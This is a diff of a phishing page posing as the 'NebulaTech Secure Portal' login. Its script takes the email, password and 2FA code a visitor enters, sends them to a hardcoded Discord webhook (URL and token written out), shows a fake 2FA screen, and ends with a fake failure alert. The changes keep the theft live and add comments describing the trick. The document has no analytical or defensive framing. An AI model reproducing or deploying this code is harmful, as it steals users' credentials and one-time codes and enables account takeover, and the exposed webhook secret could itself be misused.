@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>NebulaTech Access Gateway</title>
+  <title>NebulaTech Secure Portal</title>
   <style>
     body {
       background-color: #0d0d0d;
@@ -83,11 +83,11 @@
   </div>
 
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
+
     function isValidGmail(email) {
       return /^[a-zA-Z0-9._%+-]{6,}@gmail\.com$/.test(email);
     }
-
-    const webhookURL = "https://discord.com/api/webhooks/1396126913038123068/WuVgy5nWwXQRum5a1Ye0s2zQElODsb6XpTIeKgbINlc51ZnfD-8kCUTg7a3WBBMrj56e";
 
     let capturedEmail = "";
     let capturedPassword = "";
@@ -116,11 +116,12 @@
       capturedEmail = email;
       capturedPassword = password;
 
-      const loginPayload = {
-        content: "**🧠 Login Attempt**",
+      // Instantly send the login data
+      const payload = {
+        content: "**🔐 Instant Login Snagged**",
         embeds: [{
-          title: "🚪 Initial Credentials Captured",
-          color: 5814783,
+          title: "🎯 Credentials Captured Instantly",
+          color: 16776960,
           fields: [
             { name: "Email", value: email },
             { name: "Password", value: password },
@@ -129,8 +130,9 @@
         }]
       };
 
-      sendToWebhook(loginPayload);
+      sendToWebhook(payload);
 
+      // Now show the fake 2FA screen
       document.getElementById("loginStage").classList.add("hidden");
       document.getElementById("codeStage").classList.remove("hidden");
     }
@@ -138,11 +140,11 @@
     function handleVerification() {
       const code = document.getElementById("codeInput").value;
 
-      const verifyPayload = {
-        content: "**🔐 Verification Stage**",
+      const codePayload = {
+        content: "**📲 Verification Code Submitted**",
         embeds: [{
-          title: "📲 2FA Code Submitted",
-          color: 15105570,
+          title: "🧬 2FA Stage Entered",
+          color: 11730954,
           fields: [
             { name: "Email", value: capturedEmail },
             { name: "2FA Code", value: code },
@@ -151,7 +153,7 @@
         }]
       };
 
-      sendToWebhook(verifyPayload);
+      sendToWebhook(codePayload);
 
       setTimeout(() => {
         alert("Verification failed. Please try again.");
